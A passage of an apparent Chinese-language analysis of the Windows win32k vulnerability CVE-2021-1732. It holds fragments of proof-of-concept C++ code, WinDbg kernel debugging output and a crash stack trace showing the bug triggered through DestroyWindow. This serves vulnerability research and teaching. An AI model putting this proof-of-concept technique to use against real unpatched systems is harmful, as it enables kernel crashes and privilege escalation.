        if (!normalClass)
        {
            ErrorOutput("[-] Failed to register normal class\n");
        }
        wc.lpszClassName = "Magic";
        wc.cbWndExtra = global::magicNum;
        ATOM magicClass = RegisterClassA(&wc);
        if (!magicClass)
        {
            ErrorOutput("[-] Failed to register magic class\n");
        }
        for (ULONG32 idx = 0; idx 
## POC调试
在回调函数内设置断点，根据命令行打印出来的指针查看内存，可以看到首地址存储的句柄，偏移0xc8处即为特殊的数值0xabcd
    2: kd> dq 27dab7814c0 l20
    0000027d`ab7814c0  00000000`00020350 00000000`000314c0
    0000027d`ab7814d0  00000000`00000000 08000000`08000000
    0000027d`ab7814e0  00007ff6`13040000 00000000`00000000
    0000027d`ab7814f0  00000000`000012b0 00000000`00000000
    0000027d`ab781500  00000000`00000000 00000000`00000000
    0000027d`ab781510  00000000`00000000 00000000`00000000
    0000027d`ab781520  00000000`00000000 00000000`00000000
    0000027d`ab781530  00000000`00000000 00007ff6`130410a0
    0000027d`ab781540  00000000`0000f160 00000000`00000000
    0000027d`ab781550  00000000`00000000 00000000`00000000
    0000027d`ab781560  00000000`00000000 00000000`00000000
    0000027d`ab781570  00000000`00000000 00000000`00000000
    0000027d`ab781580  00000000`00000000 00000000`0000abcd
    0000027d`ab781590  00000000`00020221 00000000`00000000
    0000027d`ab7815a0  00000000`00000000 00000001`00000000
    0000027d`ab7815b0  00000000`00000000 00000000`00000000
    2: kd> ? 0000027d`ab781588-0000027d`ab7814c0
    Evaluate expression: 200 = 00000000`000000c8
跟踪内核中的xxxConsoleControl函数，查看内核中的窗口结构，函数没执行完时，标志ExtraFlag还没有设置，一旦执行完就设置了标志ExtraFlag
    2: kd> dq ffff8a5905879150 l10
    ffff8a59`05879150  00000000`00020350 00000000`00000001
    ffff8a59`05879160  ffff8a59`02ee48a0 ffff8f01`0b551de0
    ffff8a59`05879170  ffff8a59`05879150 ffff8a59`012314c0
    ffff8a59`05879180  00000000`000314c0 00000000`00000000
    ffff8a59`05879190  00000000`00000000 00000000`00000000
    ffff8a59`058791a0  00000000`00000000 00000000`00000000
    ffff8a59`058791b0  00000000`00000000 ffff8a59`00830a80
    ffff8a59`058791c0  00000000`00000000 00000000`00000000
    2: kd> dq poi(@rax+28)
    ffff8a59`012314c0  00000000`00020350 00000000`000314c0
    ffff8a59`012314d0  00000000`00000000 08000000`08000000
    ffff8a59`012314e0  00007ff6`13040000 00000000`00000000
    ffff8a59`012314f0  00000000`000012b0 00000000`00000000
    ffff8a59`01231500  00000000`00000000 00000000`00000000
    ffff8a59`01231510  00000000`00000000 00000000`00000000
    ffff8a59`01231520  00000000`00000000 00000000`00000000
    ffff8a59`01231530  00000000`00000000 00007ff6`130410a0
    2: kd> ? poi(poi(@rax+28) + e8)
    Evaluate expression: 4294967296 = 00000001`00000000
    2: kd> g
    Break instruction exception - code 80000003 (first chance)
    0033:00007fff`f6820192 cc              int     3
    1: kd> dq ffff8a59`012314c0+e8 L1
    ffff8a59`012315a8  00000001`00100818
    1: kd> ? 00000001`00100818 & 0x800
    Evaluate expression: 2048 = 00000000`00000800
在xxxCreateWindowEx中调用`win32kfull!xxxClientAllocWindowClassExtraBytes`函数的下一条指令下断点
    3: kd> ba e1 ffff8348`7883ce09
    3: kd> g
    Breakpoint 0 hit
    win32kfull!xxxCreateWindowEx+0x1259:
    ffff8348`7883ce09 488bc8          mov     rcx,rax
    3: kd> r rax
    rax=0000000000001234
执行完这个xxxCreateWindowEx函数后，继续执行poc中的DestroyWindow就会触发蓝屏
    NOTE: The trap frame does not contain all registers.
    Some register values may be zeroed or incorrect.
    rax=00000000000c2000 rbx=0000000000000000 rcx=00000000000c2000
    rdx=0000000000000000 rsi=0000000000000000 rdi=0000000000000000
    rip=fffff80557e61cf1 rsp=fffff080407c6740 rbp=ffff8a5901200040
     r8=ffff8a590113f000  r9=00000000014b92ca r10=ffff8a5901201234
    r11=014b92ca3db812e6 r12=0000000000000000 r13=0000000000000000
    r14=0000000000000000 r15=0000000000000000
    iopl=0         nv up ei ng nz na po nc
    nt!RtlpHpVsContextFree+0x41:
    fffff805`57e61cf1 410fb74822      movzx   ecx,word ptr [r8+22h] ds:ffff8a59`0113f022=????
    Resetting default scope
    STACK_TEXT:  
    fffff080`407c5b68 fffff805`580c7422     : ffff8a59`0113f022 00000000`00000003 fffff080`407c5cd0 fffff805`57f3bb20 : nt!DbgBreakPointWithStatus
    fffff080`407c5b70 fffff805`580c6b12     : fffff805`00000003 fffff080`407c5cd0 fffff805`57ff3960 00000000`00000050 : nt!KiBugCheckDebugBreak+0x12
    fffff080`407c5bd0 fffff805`57fdf327     : fffff805`582844f8 fffff805`580f0fb5 00000000`00000000 00000000`00000000 : nt!KeBugCheck2+0x952
    fffff080`407c62d0 fffff805`58001663     : 00000000`00000050 ffff8a59`0113f022 00000000`00000000 fffff080`407c65b0 : nt!KeBugCheckEx+0x107
    fffff080`407c6310 fffff805`57e90edf     : fffff080`407f1000 00000000`00000000 00000000`00000000 ffff8a59`0113f022 : nt!MiSystemFault+0x1d6933
    fffff080`407c6410 fffff805`57fed320     : 00000000`00000000 fffff805`57e84817 00000000`00000001 00000000`00000000 : nt!MmAccessFault+0x34f
    fffff080`407c65b0 fffff805`57e61cf1     : ffffa10d`a650ec60 fffff805`5905208d 00000000`00000350 ffff8f01`0e353080 : nt!KiPageFault+0x360
    fffff080`407c6740 fffff805`57f0b7fa     : 00000000`00000008 fffff080`407c6840 00000000`00000008 00000000`00000003 : nt!RtlpHpVsContextFree+0x41
    fffff080`407c67e0 fffff805`57f0b77c     : ffff8a59`01200000 00000000`00000000 ffff8a59`01201234 00000000`000002a0 : nt!RtlpFreeHeapInternal+0x5a
    fffff080`407c6860 ffff8a2a`1d249973     : 00000000`00001234 00000000`00000000 00000000`00000000 ffff8a59`05879150 : nt!RtlFreeHeap+0x3c
    fffff080`407c68a0 ffff8a2a`1d2463be     : ffff8a59`00693920 00000000`08000100 ffff8a59`02ee48a0 ffff8a59`05879150 : win32kfull!xxxFreeWindow+0x4bf
    fffff080`407c69d0 ffff8a2a`1d319e3a     : 00007ff6`13043474 00000000`00000000 00007ff6`13040000 00000000`00000020 : win32kfull!xxxDestroyWindow+0x3ae
    fffff080`407c6ad0 fffff805`57ff0b18     : 0000027d`40000600 0000000a`00000000 ffffffff`ffe17b80 ffff8f01`0d3e6be0 : win32kfull!NtUserDestroyWindow+0x3a
    fffff080`407c6b00 00007fff`f5cb23e4     : 00007ff6`1304151d 00000000`00000098 00000000`00000000 00007ff6`00000000 : nt!KiSystemServiceCopyEnd+0x28
    000000d5`26dffd28 00007ff6`1304151d     : 00000000`00000098 00000000`00000000 00007ff6`00000000 00000000`00000000 : win32u!NtUserDestroyWindow+0x14
    000000d5`26dffd30 00000000`00000098     : 00000000`00000000 00007ff6`00000000 00000000`00000000 00000000`00000000 : poc!main+0x33d [D:\SelfLearn\C++Project\Exploit\Exploit\2021-1732-EXP.cpp @ 170] 
    000000d5`26dffd38 00000000`00000000     : 00007ff6`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : 0x98
# 文章致谢
@红雨滴团队
@saturn35